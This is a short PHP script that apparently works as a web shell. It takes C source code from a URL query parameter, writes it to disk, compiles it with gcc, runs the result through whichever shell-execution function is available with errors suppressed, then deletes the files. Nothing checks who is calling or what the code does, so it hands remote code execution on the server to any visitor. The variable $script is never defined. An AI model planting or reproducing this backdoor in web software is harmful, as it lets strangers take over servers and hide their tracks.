<?php
function exe($c){
	$out = "";
	$c = $c." 2>&1";

	if(is_callable('system')) {
		ob_start();
		@system($c);
		$out = ob_get_contents();
		ob_end_clean();
	}
	if(is_callable('shell_exec')){
		$out = @shell_exec($c);
		
	}
	if(is_callable('exec')) {
		@exec($c,$r);
	}
	if(is_callable('passthru')) {
		ob_start();
		@passthru($c);
		$out = ob_get_contents();
		ob_end_clean();
	}
	return $out;
}

$code = $_GET['code'];
file_put_contents($script.".c", $code);
if(is_file($script.".c")){
	$scriptout = $script.".exe";
	$res = exe("gcc ".$script.".c -o ".$scriptout);
	$res = exe($scriptout);
	rename($scriptout, $scriptout."del");
	unlink($scriptout."del");
	unlink($script.".c");
}

?>